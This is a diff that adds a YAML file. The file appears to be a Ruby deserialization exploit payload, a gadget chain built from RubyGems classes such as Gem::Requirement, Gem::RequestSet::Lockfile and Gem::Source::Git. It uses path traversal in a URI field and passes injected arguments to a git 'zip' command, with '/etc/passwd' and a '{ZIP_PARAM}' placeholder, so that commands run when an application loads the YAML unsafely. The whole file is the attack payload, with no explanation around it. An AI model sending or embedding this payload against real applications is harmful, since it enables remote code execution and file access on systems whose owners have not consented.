@@ -1,0 +1,50 @@
+- !ruby/class 'Gem::SpecFetcher'
+- ? !ruby/object:Gem::Requirement
+    requirements:
+      - - "~>"
+        - !ruby/object:Gem::RequestSet::Lockfile
+          set: !ruby/object:Gem::RequestSet
+            sorted_requests:
+              - !ruby/object:Gem::Resolver::IndexSpecification
+                name: name
+                source: !ruby/object:Gem::Source
+                  uri: !ruby/object:URI::HTTP
+                    path: "/"
+                    scheme: s3
+                    host: rubygems.org/quick/Marshal.4.8/bundler-2.2.27.gemspec.rz?
+                    port: "/../../../../../../../../../../../../../../../tmp/cache/bundler/git/any-c5fe0200d1c7a5139bd18fd22268c4ca8bf45e90/"
+                    user: any
+                    password: any
+                  update_cache: true
+          dependencies: []
+  : any
+- ? !ruby/object:Gem::Requirement
+    requirements:
+      - - "~>"
+        - !ruby/object:Gem::RequestSet::Lockfile
+          set: !ruby/object:Gem::RequestSet
+            sorted_requests:
+              - !ruby/object:Gem::Resolver::SpecSpecification
+                spec: !ruby/object:Gem::Resolver::GitSpecification
+                  source: !ruby/object:Gem::Source::Git
+                    git: zip
+                    reference: "/etc/passwd"
+                    root_dir: "/tmp"
+                    repository: any
+                    name: any
+                  spec: !ruby/object:Gem::Resolver::Specification
+                    name: name
+                    dependencies: []
+              - !ruby/object:Gem::Resolver::SpecSpecification
+                spec: !ruby/object:Gem::Resolver::GitSpecification
+                  source: !ruby/object:Gem::Source::Git
+                    git: zip
+                    reference: "{ZIP_PARAM}"
+                    root_dir: "/tmp"
+                    repository: any
+                    name: any
+                  spec: !ruby/object:Gem::Resolver::Specification
+                    name: name
+                    dependencies: []
+          dependencies: []
+  : any
